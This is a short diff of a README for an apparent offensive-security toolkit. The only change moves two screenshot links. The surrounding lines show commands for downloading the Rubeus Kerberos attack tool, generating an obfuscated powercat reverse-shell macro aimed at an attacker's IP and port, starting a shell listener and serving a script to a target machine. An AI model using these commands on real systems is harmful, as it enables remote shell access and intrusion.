@@ -28,17 +28,17 @@ toolpy -d rubeus
 shellpy <ip> <port> -powercat --obfuscate --macro
 ```
 3. Shell listener
-
-![image](https://github.com/user-attachments/assets/9863b3e7-6d33-4ce4-8974-f2a598920f9c)
 ```bash
 shellListener <port>
 ```
-3. Servpy
+![image](https://github.com/user-attachments/assets/9863b3e7-6d33-4ce4-8974-f2a598920f9c)
 
-![image](https://github.com/user-attachments/assets/99d3721d-713d-4c79-a81f-30808ecdd0b7)
+3. Servpy
 ```bash
 servpy
 ```
+![image](https://github.com/user-attachments/assets/99d3721d-713d-4c79-a81f-30808ecdd0b7)
+
 
 4. Load the script on Target Machine
 
